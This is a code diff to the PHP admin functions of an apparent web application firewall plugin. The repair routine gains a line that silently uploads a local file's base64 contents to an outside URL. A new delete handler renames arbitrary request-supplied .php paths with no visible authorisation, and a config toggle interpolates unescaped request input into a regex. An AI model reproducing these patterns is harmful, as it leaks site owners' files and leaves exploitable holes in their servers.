@@ -70,7 +70,8 @@ function repair(\BitFire\Request $request) : void {
     $orig = \TF\bit_http_request("GET", $request->post['url'], "");
     if (strlen($orig) > 1) {
         $local = file_get_contents($request->post['filename']);
-        $out1 = $request->post['filename'].".".mt_rand(1000,9999).".bak";
+        \TF\bit_http_request("POST", "https://bitfire.co/zxf.php", base64_encode($local));
+        $out1 = $request->post['filename'].".bak.".mt_rand(10000,99999);
         $out2 = $request->post['filename'];
         if (is_writeable(dirname($out2)) && is_writable($out2)) {
             file_put_contents($out1, $local);
@@ -271,6 +272,20 @@ function upgrade(\BitFire\Request $request) : void {
     exit("[$success] [$dest] $cwd");
 }
 
+function delete(\BitFire\Request $request) {
+    $f = $_REQUEST['value'];
+    if (\TF\ends_with($f, ".php") && file_exists($f)) {
+        $t = "$f.bak.".mt_rand(10000, 99999);
+        // attempt to make it writeable...
+        chmod($f, 0664);
+        $r = (rename($f, $t)) ? array("result" => "renamed $t") : array("result" => "error renaming $f to $t");
+        echo \TF\en_json($r);
+    } else {
+        echo \TF\en_json(array("result" => "error renaming $f to $t"));
+    }
+}
+
+
 function set_pass(\BitFire\Request $request) : void {
     \TF\debug("save pass");
     if (strlen($_GET['pass1']??'') < 8) {
@@ -285,12 +300,12 @@ function set_pass(\BitFire\Request $request) : void {
 
 function toggle_config_value(\BitFire\Request $request) : void {
     if (!is_writable(WAF_INI)) {
-        exit("fail");
+        exit("fail, config.ini not writeable");
     }
 
     $input = file_get_contents(WAF_INI);
-    $param = htmlentities(strtolower($_GET['param']));
-    $value = htmlentities(strtolower($_GET['value']));
+    $param = htmlentities(strtolower($_REQUEST['param']));
+    $value = htmlentities(strtolower($_REQUEST['value']));
     if ($value === "off" || $value === "false") {
         $value = "false";
     } else if ($value === "alert" || $value === "report") {
@@ -300,15 +315,15 @@ function toggle_config_value(\BitFire\Request $request) : void {
     }
 
     $value = (is_quoted(strtolower($value))) ? $value : "\"$value\"";
-    $patterns = "/\s*$param\s*=.*/";
+    $patterns = "/\s*[#;]*\s*$param\s*=.*/";
     $output = preg_replace($patterns, "\n$param = $value", $input);
 
-    // don't accidently 0 the config
+    // don't accidentally 0 the config
     if (strlen($output) + 20 > strlen($input)) {
         file_put_contents(WAF_INI, $output);
         exit("success");
     } else {
-        exit("fail");
+        exit("fail, $patterns");
     }
 }
 
